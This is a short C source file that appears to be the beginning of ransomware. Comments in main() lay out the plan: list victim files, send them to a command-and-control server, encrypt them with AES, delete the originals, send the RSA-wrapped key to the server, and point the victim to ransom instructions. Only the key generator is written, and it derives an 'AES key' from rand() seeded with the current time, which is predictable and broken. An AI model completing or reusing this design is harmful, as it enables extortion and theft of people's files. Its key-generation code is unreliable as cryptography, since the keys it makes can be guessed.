#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>

char *generateAesKey(int size, const char *charset);

int main() {
    //Generate AES key
    char *aes_key = generateAesKey(256, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789;/!*%$&#@");

    //List all the files we want to borrow ;)

    //Send the raw files to C2

    //Encrypt each file with AES

    //Delete raw files

    //Encrypt the AES key with the RSA public key

    //Send the encrypted AES key to C2


    free(aes_key);
    //Redirect to C2's web page for instructions

    return 0;
}

char *generateAesKey(int size, const char *charset){
    srand(time(NULL));

    int charset_len = strlen(charset);
    char *key = (char *)malloc((size + 1) * sizeof(char));

    for (int i = 0; i < size; i++) {
        key[i] = charset[rand() % charset_len];
    }

    key[size] = '\0';
    return key;
}
